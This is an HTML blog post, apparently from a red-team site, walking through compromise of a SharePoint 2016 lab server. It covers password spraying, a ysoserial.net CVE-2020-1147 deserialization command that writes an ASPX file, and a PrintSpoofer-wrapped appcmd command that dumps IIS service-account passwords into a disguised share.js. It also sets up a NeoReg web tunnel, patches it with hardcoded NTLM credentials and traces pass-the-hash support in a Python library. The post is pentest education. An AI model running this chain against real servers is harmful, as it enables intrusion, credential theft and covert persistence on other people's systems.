@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html prefix="og: http://ogp.me/ns#" lang="en">
+
+<head>
+  <link rel="icon" type="image/png" href="https://www.crummie5.club/favicon.ico" />
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="https://www.crummie5.club/rss.xml">
+  
+<link rel="stylesheet" href="https://www.crummie5.club/main.css">
+
+
+  <link href="https://fonts.googleapis.com/css?family=Ubuntu&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&display=swap" rel="stylesheet">
+
+  <script src="https://www.crummie5.club/elasticlunr.min.js"></script>
+  <script src="https://www.crummie5.club/search_index.en.js"></script>
+  <script src="https://www.crummie5.club/search.js"></script>
+  <script>'https:' !== window.location.protocol && (window.location.protocol = 'https')</script>
+  
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <meta property="og:site_name" content="Crummie5">
+  <meta name="robots" content="index, nofollow">
+  <meta name="language" content="English">
+
+  
+<title>Crummie5 | The Lone Sharepoint</title>
+<meta name="twitter:card" content="summary_large_image">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://www.crummie5.club/the-lone-sharepoint/">
+<meta property="og:image" content="https://www.crummie5.club/the-lone-sharepoint/fig4.png">
+<meta property="og:title" content="The Lone Sharepoint">
+<meta property="og:description" content="In this post we are going to explore some particular cases when targeting Sharepoint instances along your way in Pentests&#x2F;Red Team exercises. I noticed that there is a lot of information that can help us, but it is spread among multiple sources, so I made my own compilation combined with my research. ">
+<meta name="description" content="In this post we are going to explore some particular cases when targeting Sharepoint instances along your way in Pentests&#x2F;Red Team exercises. I noticed that there is a lot of information that can help us, but it is spread among multiple sources, so I made my own compilation combined with my research. ">
+
+
+</head>
+
+
+<body>
+  <div class="header_container">
+    <header>
+      <img src="https://www.crummie5.club/logo.png" class="logo-img" alt="just a foca">
+      <h1 class="logo-title"><a href="https://www.crummie5.club">Crummie5</a></h1>
+    </header>
+     <div class="menu-container">
+      <ul class="menu">
+        <li class="menu-element"><a href="https://www.crummie5.club">home</a></li>
+        <li class="menu-element"><a href="https://www.crummie5.club/about">about us</a></li>
+        <li class="menu-element dropdown-container">
+          <label for="tags">tags</label>
+          <input id="tags" class="tags-toggle" type="checkbox" style="display:none" value="0">
+          <div class="dropdown">
+            <ul class="submenu">
+              <li class="submenu-element">
+                <a href="https://www.crummie5.club/tags/linux">Linux</a>
+              </li>
+              <li class="submenu-element">
+                <a href="https://www.crummie5.club/tags/windows">Windows</a>
+              </li> 
+              <li class="submenu-element">
+                <a href="https://www.crummie5.club/tags/malware">Malware</a>
+              </li>
+              <li class="submenu-element">
+                <a href="https://www.crummie5.club/tags">View All</a>
+              </li>
+            </ul>
+          </div>
+        </li>
+        <div class="search_bar_container menu-element">
+          <input type="text" placeholder="Search..." class="search_bar">
+          <div class="search-results">
+            <div class="search-results__items"></div>
+          </div>
+        </div>
+      </ul>
+    </div>
+    <div class="search_bar_container mobile">
+      <input type="text" placeholder="Search..." class="search_bar">
+      <div class="search-results">
+        <div class="search-results__items mobile"></div>
+      </div>
+    </div>
+  </div>
+
+  
+<div class="post">
+    <h1 class="post-title">
+        The Lone Sharepoint
+    </h1>
+    <div class="post-data">
+        
+
+<b>Acap4z</b> on 2021-02-12 &nbsp;·&nbsp;
+
+<svg viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round"
+    stroke-linejoin="round" stroke-width="6.25%" preserveAspectRatio="xMaxYMax">
+    <circle cx="16" cy="16" r="14" />
+    <path d="M16 8 L16 16 20 20" />
+</svg>
+17 minutes read
+<br>
+
+<svg class="tag-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width="16" height="16" fill="none"
+    stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+    <circle cx="24" cy="8" r="2" />
+    <path d="M2 18 L18 2 30 2 30 14 14 30 Z" />
+</svg>
+
+
+
+
+
+<a class="post-data-tag" href="https://www.crummie5.club/tags/windows/">#Windows&nbsp;</a>
+
+
+
+<a class="post-data-tag" href="https://www.crummie5.club/tags/active-directory/">#Active Directory&nbsp;</a>
+
+
+
+<a class="post-data-tag" href="https://www.crummie5.club/tags/privilege-escalation/">#Privilege Escalation&nbsp;</a>
+
+
+
+
+
+·&nbsp;
+
+
+<a href="https://twitter.com/intent/tweet?text=The%20Lone%20Sharepoint%3A%20In%20this%20post%20we%20are%20going%20to%20explore%20some%20particular%20cases%20when%20targeting%20Sharepoint%20instances%20along%20your%20way%20in%20Pentests&#x2F;Red%20Team%20exercises.%20I%20noticed%20that%20there%20is%20a%20lot%20of%20information%20that%20can%20help%20us%2C%20but%20it%20is%20spread%20among%20multiple%20sources%2C%20so%20I%20made%20my%20own%20compilation%20combined%20with%20my%20research.%20%0A&url=https://www.crummie5.club/the-lone-sharepoint/">
+    <svg id="i-twitter" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" width="32" height="32"
+        style="width:1.2rem;height:1.2rem">
+        <path stroke-width="0" fill="currentColor"
+            d="M60 16 L54 17 L58 12 L51 14 C42 4 28 15 32 24 C16 24 8 12 8 12 C8 12 2 21 12 28 L6 26 C6 32 10 36 17 38 L10 38 C14 46 21 46 21 46 C21 46 15 51 4 51 C37 67 57 37 54 21 Z" />
+    </svg>
+</a>
+
+<a
+    href="https://www.linkedin.com/shareArticle?mini=true&title=The%20Lone%20Sharepoint%3A%20In%20this%20post%20we%20are%20going%20to%20explore%20some%20particular%20cases%20when%20targeting%20Sharepoint%20instances%20along%20your%20way%20in%20Pentests&#x2F;Red%20Team%20exercises.%20I%20noticed%20that%20there%20is%20a%20lot%20of%20information%20that%20can%20help%20us%2C%20but%20it%20is%20spread%20among%20multiple%20sources%2C%20so%20I%20made%20my%20own%20compilation%20combined%20with%20my%20research.%20%0A&url=https://www.crummie5.club/the-lone-sharepoint/">
+    <svg id="i-linkedin" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="32" height="32"
+        style="width:1.3rem;height:1.3rem">
+        <rect height="11" width="4" x="3" y="9"></rect>
+        <circle cx="5" cy="5" r="2"></circle>
+        <path
+            d="M16.5,8.25A4.47251,4.47251,0,0,0,13,9.95343V9H9V20h4V13a2,2,0,0,1,4,0v7h4V12.75A4.5,4.5,0,0,0,16.5,8.25Z">
+        </path>
+    </svg>
+</a>
+
+<a href="https://telegram.me/share/?text=%0AThe%20Lone%20Sharepoint%3A%20In%20this%20post%20we%20are%20going%20to%20explore%20some%20particular%20cases%20when%20targeting%20Sharepoint%20instances%20along%20your%20way%20in%20Pentests&#x2F;Red%20Team%20exercises.%20I%20noticed%20that%20there%20is%20a%20lot%20of%20information%20that%20can%20help%20us%2C%20but%20it%20is%20spread%20among%20multiple%20sources%2C%20so%20I%20made%20my%20own%20compilation%20combined%20with%20my%20research.%20&url=https://www.crummie5.club/the-lone-sharepoint/">
+    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 1000 1000"
+        width="32" height="32" style="width:1.1rem;height:1.1rem">
+        <path
+            d="M500,10C229.4,10,10,229.4,10,500s219.4,490,490,490s490-219.4,490-490S770.6,10,500,10z M740.8,345.9l-80.4,378.8c-5.5,27-21.8,33.3-44.4,20.9L493.5,655l-58.8,57.2c-6.9,6.7-12.3,12.3-24.5,12.3c-15.9,0-13.2-5.9-18.6-21.1l-41.7-137l-121.2-37.7c-26.2-8-26.4-26,5.9-38.9l472-182.2C728.2,297.9,749,312.8,740.8,345.9L740.8,345.9z" />
+    </svg>
+</a>
+
+
+    </div>
+    <div class="post-content">
+        <p>Hello dear friends. Today we are going to explore some particular cases when targeting Sharepoint instances along your way in Pentests/Red Team exercises. When I faced this suite for the first time, I noticed that there is a lot of information that can help us, but it is spread among multiple sources, so I wanted to share my own compilation combined with my research work. </p>
+<p>As you may know, Microsoft Sharepoint is a web-based collaborative platform that integrates with Microsoft Office. Primarily sold as a document management and storage system, the product is highly configurable and usage varies substantially among organizations. Focusing on what is of our interest, this is a web-driven suite usually accessed by authenticated corporate users and known to suffer from a myriad of CVE reported issues if not patched. These last ones lead to Remote Code Execution (RCE) and ultimately allow attackers to compromise the server instance. Sounds like a good target to compromise.</p>
+<p>However, the complete exploitation process is not always straightforward and we may find some difficulties when trying to escalate privileges or set up some persistence implants. We are going into detail in the following sections.</p>
+<p id="zola-continue-reading"><a name="continue-reading"></a></p>
+<h2 id="intel-report">Intel Report<a class="zola-anchor" href="#intel-report" aria-label="Anchor link for: intel-report">
+    <svg id="i-link" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width="32" height="32" fill="none"
+        stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+        <path
+            d="M18 8 C18 8 24 2 27 5 30 8 29 12 24 16 19 20 16 21 14 17 M14 24 C14 24 8 30 5 27 2 24 3 20 8 16 13 12 16 11 18 15">
+        </path>
+    </svg>
+</a>
+</h2>
+<p>First of all, let's explore the latest RCE issues with their exploitation process explained somewhere:</p>
+<ul>
+<li><a href="https://srcincite.io/pocs/cve-2020-16952.py.txt">CVE-2020-16952</a>: Server Side Inclusion leverages web.config disclosure, which leads to machine key leakage, ultimately achieving RCE using a serialization gadget in a crafted ViewState.</li>
+<li><a href="https://www.zerodayinitiative.com/blog/2020/6/16/cve-2020-1181-sharepoint-remote-code-execution-through-web-parts">CVE-2020-1181</a>: WebParts allows unrestricted ASP.NET edition and execution through the <code>WikiContentWebpart</code> type.</li>
+<li><a href="https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html">CVE-2020-1147</a>: Untrusted types deserialization in <code>XmlTextReader</code> through <code>__SUGGESTIONSCACHE__</code> parameter leads to RCE even with no edit permissions.</li>
+<li><a href="https://www.thezdi.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters">CVE-2020-0932</a>: WebParts does not restrict types when parsing some XML contents, leading to a RCE chain through <code>System.Resources.ResourceSet</code> and a crafted <code>*.resources</code> file.</li>
+<li><a href="https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability">CVE-2019-0604</a>: Deserialization issues involving <code>XmlSerializer</code> lead to RCE.</li>
+</ul>
+<p>As you may noticed, all of these vulnerabilities can provide command execution to attackers, but they require authenticated access by default. Since most Sharepoint instances are connected to Active Directory and we assume no access to the complete list of users, the most suitable approach in this case would be user gathering from OSINT resources and then Password Spraying against authenticated Sharepoint endpoints. Another option would be to fuzz endpoints using specific <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/Sharepoint.fuzz.txt">wordlists like SecLists</a> and try to find unauthenticated content, hopefully finding vulnerable endpoints or information disclosure issues regarding AD users. This already happened in real cases, such as with <a href="https://hackerone.com/reports/534630">the U.S. Dept Of Defense</a>.</p>
+<p>We won't go into much detail with user gathering. I just want to note the obvious but most important thing: the more complete the user list is, the greater are the chances to get in. At this point you surely have the basic information to make a good user list: user syntax (name.surname, n_surname, etc) disclosed in metadata and user databases (company website or directories, LinkedIn, Search Engines, etc).</p>
+<p>Dorks in Search Engines are quite powerful. They can serve you well if used wisely not only for user enumeration, but also for endpoint discovery. Some endpoint instances host more than one site, and they are not necessarily configured the same way.</p>
+<figure>
+  <img src="https://www.crummie5.club/the-lone-sharepoint//fig1.png" alt="Endpoint discovery using dorks." />
+  <figcaption>Endpoint discovery using dorks.</figcaption>
+</figure>
+<p>Once we get authenticated access, we can proceed with the exploitation itself.</p>
+<h2 id="pwning-sharepoint-from-your-home">Pwning Sharepoint from your home<a class="zola-anchor" href="#pwning-sharepoint-from-your-home" aria-label="Anchor link for: pwning-sharepoint-from-your-home">
+    <svg id="i-link" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width="32" height="32" fill="none"
+        stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+        <path
+            d="M18 8 C18 8 24 2 27 5 30 8 29 12 24 16 19 20 16 21 14 17 M14 24 C14 24 8 30 5 27 2 24 3 20 8 16 13 12 16 11 18 15">
+        </path>
+    </svg>
+</a>
+</h2>
+<p>For sake of simplicity we are going to work with CVE-2020-1147 as it is implemented in <a href="https://github.com/pwntester/ysoserial.net">Ysoserial.NET</a>, a fantastic tool to craft .NET serialized gadgets with custom payloads.</p>
+<figure>
+  <img src="https://www.crummie5.club/the-lone-sharepoint//fig2.png" alt="Ysoserial&#x27;s SharePoint payloads." />
+  <figcaption>Ysoserial&#x27;s SharePoint payloads.</figcaption>
+</figure>
+<p>There are a couple of ways to check if an asynchronous blind RCE succeeded. We can issue web requests with a custom domain pointing to our server and see if they reach it. We can even set up a non-authoritative DNS domain to see wether DNS requests can be leaked in case HTTP requests are not being received. </p>
+<h3 id="the-layouts-folder-trick">The _layouts folder trick<a class="zola-anchor" href="#the-layouts-folder-trick" aria-label="Anchor link for: the-layouts-folder-trick">
+    <svg id="i-link" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width="32" height="32" fill="none"
+        stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+        <path
+            d="M18 8 C18 8 24 2 27 5 30 8 29 12 24 16 19 20 16 21 14 17 M14 24 C14 24 8 30 5 27 2 24 3 20 8 16 13 12 16 11 18 15">
+        </path>
+    </svg>
+</a>
+</h3>
+<p>If none of these methods work we can try to write a proof file into one of the web directories and check its existence. Although default Sharepoint configurations don't allow write access to web folders, sometimes sysadmins relax these restrictions to meet application requirements, so it worths trying.</p>
+<p>A bit of research revealed that Sharepoint does not handle web files directly. However, there are some <a href="https://www.oreilly.com/library/view/professional-microsoft-sharepoint/9780470287613/9780470287613_the_special_case_of_the_underscore_layou.html">special cases such as the <code>_layouts</code> folder where files can be requested directly</a>. The best part of using this folder is that ASPX files are not subject to restriction as it happens with user pages, which are stored in the database and include the inability to use code blocks or include files from the file system, as already explained <a href="https://www.zerodayinitiative.com/blog/2020/6/16/cve-2020-1181-sharepoint-remote-code-execution-through-web-parts">here</a>.</p>
+<p>From now on, all practical explanations will be based in the testing Sharepoint 2016 VM available <a href="https://gauravmahajan.net/2017/10/06/sharepoint-server-2016-virtual-machine-download/">here</a>. We will try to upload some testing code to check if we can write into the <code>_layouts</code> folder with the current IIS Pool user.</p>
+<pre style="background-color:#2b2c2f;">
+<span style="color:#cccece;">&lt;%@ Import Namespace=&quot;Microsoft.SharePoint&quot; %&gt;
+    
+</span><span style="color:#5fb3b3;">&lt;!</span><span style="color:#eb606b;">DOCTYPE html PUBLIC </span><span style="color:#99c794;">&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;
+	&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</span><span style="color:#5fb3b3;">&gt;
+&lt;</span><span style="color:#eb606b;">html</span><span style="color:#5fb3b3;">&gt;
+&lt;</span><span style="color:#eb606b;">head</span><span style="color:#5fb3b3;">&gt;&lt;/</span><span style="color:#eb606b;">head</span><span style="color:#5fb3b3;">&gt;
+&lt;</span><span style="color:#eb606b;">body</span><span style="color:#5fb3b3;">&gt;</span><span style="color:#cccece;">
+&lt;%= &quot;testprint&quot; %&gt;
+</span><span style="color:#5fb3b3;">&lt;/</span><span style="color:#eb606b;">body</span><span style="color:#5fb3b3;">&gt;
+&lt;/</span><span style="color:#eb606b;">html</span><span style="color:#5fb3b3;">&gt;
+</span></pre>
+<p>The <code>_layouts</code> folder is located at <code>C:\Program Files\Common Files\microsoft shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\proof.aspx</code> in the file system (note that the <code>16</code> folder is version-dependent, in this case it matches Sharepoint 2016),  so we launch Ysoserial.NET using the following command:</p>
+<pre style="background-color:#2b2c2f;">
+<span style="color:#6699cc;">.</span><span style="color:#5fb3b3;">\y</span><span style="color:#6699cc;">soserial.exe</span><span style="color:#5fb3b3;"> -</span><span style="color:#f99157;">p</span><span style="color:#6699cc;"> Sharepoint</span><span style="color:#5fb3b3;"> --</span><span style="color:#f99157;">cve</span><span style="color:#5fb3b3;">=</span><span style="color:#6699cc;">CVE-2020-1147</span><span style="color:#5fb3b3;"> -</span><span style="color:#f99157;">c </span><span style="color:#5fb3b3;">&#39;</span><span style="color:#99c794;">echo ^&lt;^%@^ Import^ Namespace=&quot;Microsoft.SharePoint&quot;^ ^%^&gt;^ ^ ^&lt;^!DOCTYPE^ html^ PUBLIC^ &quot;-//W3C//DTD^ XHTML^ 1.0^ Strict//EN&quot;^ &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;^&gt;^ ^&lt;html^&gt;^ ^&lt;head^&gt;^&lt;/head^&gt;^ ^&lt;body^&gt;^ ^&lt;^%=^ &quot;testprint&quot;^ ^%^&gt;^ ^&lt;/body^&gt;^ ^&lt;/html^&gt; &gt; &quot;C:\Program Files\Common Files\microsoft shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\proof.aspx&quot;</span><span style="color:#5fb3b3;">&#39;
+</span></pre>
+<p>It is a common practice to use the same Sharepoint instance for multiple sites mapped to different domains or subdomains. Another advantage from uploading ASPX files to <code>_layouts</code> is that we don't need to find the correct site since all of them have access to this folder. In our example, one valid URL would be <code>http://intranet.sp2016gm.dev/_layouts/15/proof.aspx</code>:</p>
+<figure>
+  <img src="https://www.crummie5.club/the-lone-sharepoint//fig3.png" alt="Simple PoC demostrating RCE." />
+  <figcaption>Simple PoC demostrating RCE.</figcaption>
+</figure>
+<p>This way we confirmed Code Execution capabilities, so we can proceed to the next step.</p>
+<h2 id="domain-accounts-in-cl34rt3xt">Domain accounts in Cl34rt3xt<a class="zola-anchor" href="#domain-accounts-in-cl34rt3xt" aria-label="Anchor link for: domain-accounts-in-cl34rt3xt">
+    <svg id="i-link" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width="32" height="32" fill="none"
+        stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+        <path
+            d="M18 8 C18 8 24 2 27 5 30 8 29 12 24 16 19 20 16 21 14 17 M14 24 C14 24 8 30 5 27 2 24 3 20 8 16 13 12 16 11 18 15">
+        </path>
+    </svg>
+</a>
+</h2>
+<p>But wait a minute... do we really need to PrivEsc? That's a nice question. If you managed to confirm code execution and HTTP outbound connectivity, probably the best way to continue would be with a C2 HTTP implant. If your favourite C2 has proxy functionality then you may have a nice persistence with command execution and traffic tunneling capabilities, leaving PrivEsc as unnecessary.</p>
+<p>However, if the server is unable to perform outbound connections, there are important sub-goals we can achieve after successful Privilege Escalation in a Sharepoint machine:</p>
+<ul>
+<li>The most important fact, PrivEsc will allow us to write ASPX files into the <code>layouts</code> folder, useful for web tunneling and setting up external persistences.</li>
+<li>We are interested in recovering the domain account for IIS Pool so we can use it in further HTTP requests instead of a compromised user. This way we avoid to lose access due to the user account being locked/disabled or a password reset.</li>
+<li>Given the centralized nature of this suite (well, it can be clustered) there is a high chance of getting cached credentials from multiple users, including server admins or even Domain Admins.</li>
+</ul>
+<p>Privilege Escalation techniques in Windows can be very wide, but when we face a well-configured Windows Server 2019 instance, things can become hard. Still, there is one technique that should work fine considering that our IIS Pool account probably has the <code>SeImpersonatePrivilege</code> privilege enabled: <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">the PrintSpoofer bug</a>.</p>
+<p>It is worth to mention that the <a href="https://exploit.ph/revisiting-delegate-2-thyself.html">Delegate 2 Thyself technique</a> could also work, but the Sharepoint server must meet two requirements: it has to be adhered to a Windows domain, and the Pool account must be a local service account. In my experience, IIS Pool accounts in Sharepoint instances are usually associated to domain user accounts, which makes this path unfeasible, but if you find a case where a local account is used (i.e. <code>iis apppool\defaultapppool</code>) you could give it a try.</p>
+<p>To go through the PrintSpoofer bug, you can get the PoC from itm4n's git repo or <a href="https://github.com/CCob/SweetPotato">the SweetPotato project</a>. The tool needs to be modified to avoid AV detections and then uploaded to the target, a process which I will not utter here. Once the tool is ready,  to confirm that the PrivEsc is working, we are going to get the Pool account plaintext password and write it into the <code>layouts</code> folder so we can read it even if no outbound connection is available. The basic <code>appcmd</code> command would be the following:</p>
+<pre style="background-color:#2b2c2f;">
+<span style="color:#6699cc;">c:</span><span style="color:#5fb3b3;">\w</span><span style="color:#6699cc;">indows</span><span style="color:#5fb3b3;">\s</span><span style="color:#6699cc;">ystem32</span><span style="color:#5fb3b3;">\i</span><span style="color:#6699cc;">netsrv</span><span style="color:#5fb3b3;">\a</span><span style="color:#6699cc;">ppcmd.exe list apppool  /text:</span><span style="color:#5fb3b3;">* | </span><span style="color:#6699cc;">findstr </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">userName password</span><span style="color:#5fb3b3;">&quot; &gt; &quot;</span><span style="color:#99c794;">C:\Program Files\Common Files\microsoft shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\share.js</span><span style="color:#5fb3b3;">&quot;
+</span></pre>
+<p>Remember that this command must be launched using the PrintSpoofer tool, and wrap the entire command in Ysoserial to trigger it through serialization as explained earlier. Output will be written into the <code>layouts</code> folder as a fake JS file named <code>share.js</code>. If everything went as expected, all the service accounts configured in IIS should be displayed when opening the dump file (remember to delete the file ASAP, and don't even try this in a customer's environment without encrypting these contents first).</p>
+<figure>
+  <img src="https://www.crummie5.club/the-lone-sharepoint//fig4.png" alt="Username and password extraction" />
+  <figcaption>Username and password extraction</figcaption>
+</figure>
+<p>At this point we should have both command execution and privilege escalation in place. If we didn't get a C2 implant with proxy capabilities working, we need to proceed with the Web Tunneling step.</p>
+<h2 id="web-tunneling-in-overdrive">Web Tunneling in overdrive<a class="zola-anchor" href="#web-tunneling-in-overdrive" aria-label="Anchor link for: web-tunneling-in-overdrive">
+    <svg id="i-link" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width="32" height="32" fill="none"
+        stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+        <path
+            d="M18 8 C18 8 24 2 27 5 30 8 29 12 24 16 19 20 16 21 14 17 M14 24 C14 24 8 30 5 27 2 24 3 20 8 16 13 12 16 11 18 15">
+        </path>
+    </svg>
+</a>
+</h2>
+<p>Originally, web tunnels were configured using customized versions of <a href="https://github.com/sensepost/reGeorg">ReGeorg</a> which did a good job. This made people to create their own versions taking the original code as the base, until some time ago a new project called <a href="https://github.com/L-codes/Neo-reGeorg/blob/master/README-en.md">Neo-Regeorg or NeoReg</a> appeared with a bunch of new functions and improvements.</p>
+<p>Basic usage in NeoReg is pretty straightforward: it has one command to generate the web files using the specified key to encrypt its content (useful against non-HTTP connections and packet inspection).</p>
+<pre style="background-color:#2b2c2f;">
+<span style="color:#6699cc;">$ python neoreg.py generate</span><span style="color:#5fb3b3;"> -</span><span style="color:#f99157;">k</span><span style="color:#6699cc;"> sup3rs3cr3tp4ss
+...
+[+] Mkdir a directory: neoreg_servers
+    [+] Create neoreg server files:
+       </span><span style="color:#5fb3b3;">=&gt;</span><span style="color:#cccece;"> neoreg_servers/tunnel.ashx
+       </span><span style="color:#5fb3b3;">=&gt;</span><span style="color:#cccece;"> neoreg_servers/tunnel.aspx
+</span><span style="color:#6699cc;">...
+</span></pre>
+<p>The <code>.aspx</code> file would be the one to be written into the <code>layouts</code> folder now that we have privileges to do so. Once the web file is generated and uploaded into the target, there last command establishes connection and sets up the proxy port in our local machine:</p>
+<pre style="background-color:#2b2c2f;">
+<span style="color:#6699cc;">$ python3 neoreg.py</span><span style="color:#5fb3b3;"> -</span><span style="color:#f99157;">k</span><span style="color:#6699cc;"> sup3rs3cr3tp4ss</span><span style="color:#5fb3b3;"> -</span><span style="color:#f99157;">u</span><span style="color:#6699cc;"> http://intranet.sp2016gm.dev/_layouts/15/tunnel.aspx
+</span></pre>
+<p>However, there are two problems we are going to face if we try to use ReGeorg/NeoReg in a Sharepoint instance: NTLM Authentication and Session State.</p>
+<h2 id="ntlm-authentication">NTLM Authentication<a class="zola-anchor" href="#ntlm-authentication" aria-label="Anchor link for: ntlm-authentication">
+    <svg id="i-link" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width="32" height="32" fill="none"
+        stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+        <path
+            d="M18 8 C18 8 24 2 27 5 30 8 29 12 24 16 19 20 16 21 14 17 M14 24 C14 24 8 30 5 27 2 24 3 20 8 16 13 12 16 11 18 15">
+        </path>
+    </svg>
+</a>
+</h2>
+<p>The first problem we are facing is web NTLM Authentication. Although there is a flag to add headers which can be used to set a fixed <code>Authorization</code> header, in the case of NTLM this is not enough as it changes dinamically with its challenge-response model.</p>
+<pre style="background-color:#2b2c2f;">
+<span style="color:#cccece;"> </span><span style="color:#6699cc;">$ python3 neoreg.py</span><span style="color:#5fb3b3;"> -</span><span style="color:#f99157;">k</span><span style="color:#6699cc;"> sup3rs3cr3tp4ss</span><span style="color:#5fb3b3;"> -</span><span style="color:#f99157;">u</span><span style="color:#6699cc;"> http://intranet.sp2016gm.dev/_layouts/15/tunnel.aspx
+ ...
+ Tunnel at:
+    http://intranet.sp2016gm.dev/_layouts/15/tunnel.aspx
++------------------------------------------------------------------------+
+[ERROR   ]  Georg is not ready, please check URL and KEY. rep: </span><span style="color:#c594c5;">[</span><span style="color:#6699cc;">401</span><span style="color:#c594c5;">]</span><span style="color:#6699cc;"> Unauthorized
+</span></pre>
+<p>To fix this, we can implement a small new functionality to handle NTLM authentication by taking advantage from the existing <code>requests-ntlm2</code> Python library. It can be installed with <code>pip</code>:</p>
+<pre style="background-color:#2b2c2f;">
+<span style="color:#cccece;">pip install requests-ntlm2
+</span></pre>
+<p>In the Python client file <code>neoreg.py</code> we can use hardcoded credentials as a first approach to check if it is working. Only three lines are required to implement authentication using this library: the import sentence at <code>line 17</code> and the auth item itself at <code>lines 720-721</code>.</p>
+<pre style="background-color:#2b2c2f;">
+<span style="color:#f99157;">...
+17</span><span style="color:#5fb3b3;">.			</span><span style="color:#c594c5;">from </span><span style="color:#cccece;">requests_ntlm2 </span><span style="color:#c594c5;">import </span><span style="color:#cccece;">HttpNtlmAuth
+</span><span style="color:#f99157;">...
+717</span><span style="color:#5fb3b3;">.        </span><span style="color:#cccece;">conn</span><span style="color:#5fb3b3;">.</span><span style="color:#cccece;">headers</span><span style="color:#5fb3b3;">[&#39;</span><span style="color:#99c794;">Accept-Encoding</span><span style="color:#5fb3b3;">&#39;] = &#39;</span><span style="color:#99c794;">gzip, deflate</span><span style="color:#5fb3b3;">&#39;
+</span><span style="color:#f99157;">718</span><span style="color:#5fb3b3;">.        </span><span style="color:#cccece;">conn</span><span style="color:#5fb3b3;">.</span><span style="color:#cccece;">headers</span><span style="color:#5fb3b3;">[&#39;</span><span style="color:#99c794;">User-Agent</span><span style="color:#5fb3b3;">&#39;] = </span><span style="color:#cccece;">USERAGENT
+</span><span style="color:#f99157;">719</span><span style="color:#5fb3b3;">.        
+</span><span style="color:#f99157;">720</span><span style="color:#5fb3b3;">.        </span><span style="color:#cccece;">auth</span><span style="color:#5fb3b3;">=</span><span style="color:#6699cc;">HttpNtlmAuth</span><span style="color:#5fb3b3;">(&#39;</span><span style="color:#99c794;">gmsp2016.dev</span><span style="color:#5fb3b3;">\\</span><span style="color:#99c794;">sp_services</span><span style="color:#5fb3b3;">&#39;,&#39;</span><span style="color:#99c794;">pass@word1</span><span style="color:#5fb3b3;">&#39;)
+</span><span style="color:#f99157;">721</span><span style="color:#5fb3b3;">.        </span><span style="color:#cccece;">conn</span><span style="color:#5fb3b3;">.</span><span style="color:#cccece;">auth</span><span style="color:#5fb3b3;">=</span><span style="color:#cccece;">auth
+</span></pre>
+<p>If for some reason the cleartext password is not known but we have the NTLM hash, it can be used directly.  It is not a well documented function, but digging around into the code shows that Pass the Hash is already implemented in this library. GitHub itself is a nice tool to trace code as it is capable of matching function definitions between files.</p>
+<p>We start by looking at <code>requests_ntlm2.py</code> file until the first reference to header negotiation appears.</p>
+<figure>
+  <img src="https://www.crummie5.club/the-lone-sharepoint//fig5.png" />
+</figure>
+<p>Next file to be inspected is <code>dance.py</code> inside the same project. The <code>HttpNtlmContext</code> class is wrapping its namesake in the <code>ntlm_auth</code> project, which is the base of this one.</p>
+<figure>
+  <img src="https://www.crummie5.club/the-lone-sharepoint//fig6.png" />
+</figure>
+<p>We move to <code>ntlm.py</code> file in the original <code>ntlm_auth</code> project referred in <code>HttpNtlmContext</code> until we see the next reference to the challenge authentication message, pointing to <code>ntlm_auth/messages.py</code>.</p>
+<figure>
+  <img src="https://www.crummie5.club/the-lone-sharepoint//fig7.png" />
+</figure>
+<p>We reach the point where username and password is being computed, but we need to dive in deeper detail that we can get from <code>ntlm_auth/compute_response.py</code>.</p>
+<figure>
+  <img src="https://www.crummie5.club/the-lone-sharepoint//fig8.png" />
+</figure>
+<p>The <code>compute_response.py</code> file has another reference to the <code>_ntowfv2</code> function in <code>ntlm_auth/compute_hash.py</code>.</p>
+<figure>
+  <img src="https://www.crummie5.club/the-lone-sharepoint//fig9.png" />
+</figure>
+<p>Finally we reach the low-level detail at <code>compute_hash.py</code>, and here is where the magic happens. If the <code>password</code> string matches a full NTLM hash, no transformation is applied and the library just split LM and NT hashes to take the lattest.</p>
+<figure>
+  <img src="https://www.crummie5.club/the-lone-sharepoint//fig10.png" />
+</figure>
+<p>This operation takes place in the <code>_ntowfv1</code> function, but if we take a look to <code>_ntowfv2</code> which is the one we came from, we can see that it follows the same path since it calls <code>_ntowfv1</code> to get the digest.</p>
+<figure>
+  <img src="https://www.crummie5.club/the-lone-sharepoint//fig11.png" />
+</figure>
